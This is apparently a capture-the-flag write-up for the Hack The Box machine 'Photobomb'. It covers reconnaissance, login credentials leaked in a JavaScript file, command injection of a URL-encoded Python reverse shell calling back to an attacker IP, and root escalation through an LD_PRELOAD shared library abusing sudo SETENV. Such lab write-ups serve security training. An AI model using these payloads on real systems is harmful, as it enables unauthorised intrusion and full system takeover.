
![image](https://user-images.githubusercontent.com/87468669/197399146-df6f333b-7f0d-4919-b198-ae1964ea75ef.png)

First we start with an nmap scan 

`nmap -sC -sV -T4 -oN nmap.txt <IP>

```
# Nmap 7.93 scan initiated Sat Oct 22 18:26:00 2022 as: nmap -sC -sV -T4 -oN quickmap.txt photobomb.htb
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-server-header: nginx/1.18.0 (Ubuntu)
4111/tcp filtered xgrid
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 22 18:26:52 2022 -- 1 IP address (1 host up) scanned in 51.60 seconds
```

nice we have 2 ports open ssh and http. Let's enumerate port 80 which is http first.

first we add photobomb.htb to our hosts file

![image](https://user-images.githubusercontent.com/87468669/197399755-803eb194-e3fc-4195-a617-01e712320013.png)

Browse photobomb.htb 

![image](https://user-images.githubusercontent.com/87468669/197399812-84d6cbfe-8823-47a2-983e-f73766a2d7cc.png)

viewed page source, there's nothing hidden there 

![image](https://user-images.githubusercontent.com/87468669/197401678-9fde54af-5ede-4d22-b5fe-991302ae6bf1.png)

tried bruteforcing directories

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/HTB/Photobomb]                                                                                                       [1/66]
└─$ ffuf -u "http://photobomb.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .txt,.php,.bak,.js -fc 403                                                         

        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\       
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/       
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://photobomb.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .txt .php .bak .js  
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 843, Words: 136, Lines: 23, Duration: 250ms]
printer                 [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 2679ms]
:: Progress: [23070/23070] :: Job [1/1] :: 157 req/sec :: Duration: [0:06:47] :: Errors: 63 ::

```

navigate to /printer directory, and it is asking us to login

![image](https://user-images.githubusercontent.com/87468669/197401595-7e5bae65-4963-454c-9d33-9c770db040e1.png)

let's go back to the home page of photobomb.htb, inspect element navigate to the network path and refreshed the page 

![image](https://user-images.githubusercontent.com/87468669/197401776-dbaa6542-8d8a-4ea5-82b3-4267fbd280a3.png)

let's navigate to /photobomb.js directory 

![image](https://user-images.githubusercontent.com/87468669/197401793-03aada35-6578-4058-a358-6db6e0eb879a.png)

There we have the creds to login `username: pH0t0 password:b0Mb!`. let's login 

![image](https://user-images.githubusercontent.com/87468669/197401992-72a4289e-b0d6-4539-bcaf-3fb7bd7ad1b9.png)

Boom!!! we are in, let's enumerate to get shell.

![image](https://user-images.githubusercontent.com/87468669/197402070-fc34758f-ed21-40f5-834c-b45790eabf24.png)

the webapp is a place to download photos, intercepting with burp and try to inject a reverse shell into the request

![image](https://user-images.githubusercontent.com/87468669/197402480-b56d8651-2f38-4978-b8b0-345781aebe1a.png)

Ncat listener ready 

![image](https://user-images.githubusercontent.com/87468669/197402524-97911176-faf3-4a79-bcab-0dcb6a273b85.png)

reverse shell payload in url encode 

```
python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.18%22%2C1337%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27
```

![image](https://user-images.githubusercontent.com/87468669/197402621-5be908eb-0b85-4d18-a633-143a469476db.png)

Check ncat listener and we got shell

![image](https://user-images.githubusercontent.com/87468669/197402640-173393ec-c3dc-4979-b82e-fd182c2876ba.png)

stabilize the shell

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/HTB/Photobomb]
└─$ nc -lnvp 1337                                     
listening on [any] 1337 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.182] 33924
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$ ^Z
zsh: suspended  nc -lnvp 1337
                                                                                                                                                                      
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/HTB/Photobomb]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 1337
                               export TERM=xterm
wizard@photobomb:~/photobomb$ stty rows 40 cols 160
wizard@photobomb:~/photobomb$ 

```

now we have a stable shell and we got shell as user wizard, let's escalate privilege to root. by just checking sudo -l, we cat see that user wizard may run  (root) SETENV: NOPASSWD: /opt/cleanup.sh. 

![image](https://user-images.githubusercontent.com/87468669/197402859-cad9ad69-9a14-4354-a1a3-1299ee0faa56.png)

let's read the content of the file 

```
wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```

tried to write the file, but it is not writable. looking at the sudo commands, i found out  what we are looking for has something to do with LD_PRELOAD 😉... so let's research about LD_PRELOAD. 

[Read about it here:](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

generate a C code 

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

compile the code 

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

![image](https://user-images.githubusercontent.com/87468669/197403760-8828329d-34da-440d-a217-7051070d37ad.png)

now send it to the target machine 

![image](https://user-images.githubusercontent.com/87468669/197403798-8e78bda6-6b45-403b-ba42-d6664a8acd55.png)

now run the code

```
wizard@photobomb:/tmp$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /opt/cleanup.sh
# id   
uid=0(root) gid=0(root) groups=0(root)
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@photobomb:/tmp# 

```

![image](https://user-images.githubusercontent.com/87468669/197403872-e5c1b174-a5c8-4b47-b897-4404670072b6.png)

We are root!!!

Proof

![image](https://user-images.githubusercontent.com/87468669/197403920-bebc5e42-652b-434f-9a9e-7b11e6d12cfb.png)

And we are done, hope you had fun😉.
